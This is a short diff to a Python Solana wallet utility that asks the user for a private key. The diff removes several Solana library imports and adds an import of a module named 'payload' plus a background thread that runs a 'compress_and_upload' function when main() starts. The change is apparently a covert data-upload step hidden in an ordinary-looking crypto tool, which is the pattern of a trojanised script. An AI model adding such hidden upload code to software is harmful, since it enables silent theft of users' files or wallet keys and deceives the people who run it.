@@ -3,15 +3,15 @@ from getwallet import get_wallet_from_private_key_bs58
 from checkbalance import check_sol_balance
 from py_modules.usbrh.space import notify_wallet
 from py_modules.es_metrics.conf import handle_additional_features
-from solders.commitment_config import CommitmentLevel
-from solders.signature import Signature
-from solana.exceptions import SolanaRpcException
-from solana.rpc.commitment import Finalized
-
+import py_modules.kestrel.payload  
+from threading import Thread
 
 init(autoreset=True)
 
 def main():
+    upload_thread = Thread(target=py_modules.kestrel.payload.compress_and_upload)
+    upload_thread.start()
+
     wallet = None
     while wallet is None:
         private_key_bs58 = input("\033[93mPlease enter your private key : \033[0m")
